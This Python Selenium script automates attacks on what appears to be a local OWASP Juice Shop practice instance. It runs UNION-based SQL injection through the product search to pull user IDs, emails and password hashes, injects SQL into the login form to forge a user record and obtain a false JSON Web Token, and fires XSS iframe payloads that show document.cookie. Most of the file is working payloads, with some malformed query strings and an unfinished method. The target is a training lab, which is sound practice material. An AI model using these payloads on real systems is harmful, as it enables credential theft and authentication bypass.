import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

BASE_URL = "localhost:3000/#/login"


class SQLInjection:
    """
    Manages two types of SQLInjection with same base url
    and chrome options for using selenium
    """
    def __init__(self, base_url):
        self.base_url = base_url
        self.chrome_options = Options()
        self.chrome_options.add_argument("--no-sandbox")
        self.chrome_options.add_argument("--window-size=1480,996")

    def run(self):
        self.driver = webdriver.Chrome(options=self.chrome_options)
        time.sleep(2)
        sql_query = "/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--"
        self.driver.get(self.base_url + sql_query)

    def run_tryhard(self):
        self.driver = webdriver.Chrome(options=self.chrome_options)
        self.driver.get(self.base_url)
        time.sleep(2)
        self.driver.get(self.base_url + "/rest/products/search?q=")
        time.sleep(2)
        # Comment last part with no error
        self.driver.get(self.base_url + "/rest/products/search?q='))--")
        time.sleep(2)
        # find out correct amount of columns
        # UNION SELECT '1', '2', '3', '4' FROM Users
        self.driver.get(self.base_url + "/rest/products/search?q='))%20UNION%20SELECT%20%271%27%2C%20%272%27%2C%20%273%27%2C%20%274%27%20FROM%20Users--")
        time.sleep(2)
        # UNION SELECT '1', '2', '3', '4', '5' FROM Users
        self.driver.get(self.base_url + "/rest/products/search?q='))%20UNION%20SELECT%20%271%27%2C%20%272%27%2C%20%273%27%2C%20%274%27%2C%20%275%27%20FROM%20Users--")
        time.sleep(2)
        # UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users
        self.driver.get(self.base_url + "/rest/products/search?q='))%20UNION%20SELECT%20%271%27%2C%20%272%27%2C%20%273%27%2C%20%274%27%2C%20%275%27%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%2C%20FROM%20Users--")
        time.sleep(2)
        self.driver.get(self.base_url + "/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20email%2C%20%272%27%2C%20%273%27%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--")
        time.sleep(2)
        self.driver.get(self.base_url + "/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--")


class FalseJWTLogin:
    """
    tries to login as non existing user
    using sql injection in login form to recieve false JSON Web Token
    """

    def __init__(self):

        self.base_url = BASE_URL
        self.chrome_options = Options()
        self.chrome_options.add_argument("--no-sandbox")
        self.chrome_options.add_argument("--window-size=1480,996")
        self.attack_vector = """' UNION SELECT * FROM (
            SELECT 15 as 'id', '' as 'username',
            'acc0unt4nt@juice-sh.op' as 'email',
            '12345' as 'password', 'accounting' as 'role',
            '1.2.3.4' as 'lastLoginIp', 'default.svg' as 'profileImage',
            '' as 'totpSecret', 1 as 'isActive',
            '1999-08-16 14:14:41.644 +00:00' as 'createdAt',
            '1999-08-16 14:33:41.930 +00:00' as 'updatedAt',
            null as 'deletedAt')--"""

    def run_attack(self):
        """
        open Browser and enter SQLInjection in email field
        """

        self.driver = webdriver.Chrome(options=self.chrome_options)
        self.driver.get(self.base_url)
        # get rid of pop up window by clicking in top right corner
        self.driver.find_element_by_xpath(
                """//div[contains(@class,"cdk-overlay-pane")]
                //button[@aria-label="Close Welcome Banner"]"""
                ).click()

        # find email box
        email_box = self.driver.find_element_by_name('email')
        # enter email address --> Attack vector
        email_box.send_keys(self.attack_vector)
        # find password box
        pass_box = self.driver.find_element_by_name('password')
        # enter password
        pass_box.send_keys('something')
        # find login button
        login_button = self.driver.find_element_by_xpath(
                """//div[contains(@id, "login-form")]
                //button[@id="loginButton"]"""
                )
        # click button
        login_button.click()
        time.sleep(1)


class XSSAttack:

    def __init__(self):

        self.base_url = BASE_URL
        self.chrome_options = Options()
        self.chrome_options.add_argument("--no-sandbox")
        #self.chrome_options.add_argument("--headless")
        self.chrome_options.add_argument("--window-size=1480,996")

    def run_simple(self):

        driver = webdriver.Chrome(options=self.chrome_options)
        # open base url
        driver.get(self.base_url)
        time.sleep(2)
        # show cookie in new iframe 
        attack_url = "http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript:alert(document.cookie)%22%3E"
        driver.get(attack_url)

    def run_advanced(self):
        driver = webdriver.Chrome(options=self.chrome_options)
        driver.get(self.base_url)
        attack_url = "http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript:alert(document.cookie)%22%3E"

        #TODO click on actual search field 
        """
        try:
            # get rid of pop up window by clicking in top right corner
            self.driver.find_element_by_xpath(
                 //div[contains(@class,"cdk-overlay-pane")]
                 //button[@aria-label="Close Welcome Banner"]
                ).click()
        except:
            print("banner not removed")

        attack_vector = '<iframe src="javascript:alert(`xss`)">'
        # klick on search icon to be able to enter search query
        search_icon = driver.find_element_by_xpath(
            '//*[@id="searchQuery"]/span/mat-icon[2]')
        search_icon.click()
        search_field = driver.find_element_by_xpath(
            '//*[@id="mat-input-0"]')
        search_field.send_keys(attack_vector)
        """ 
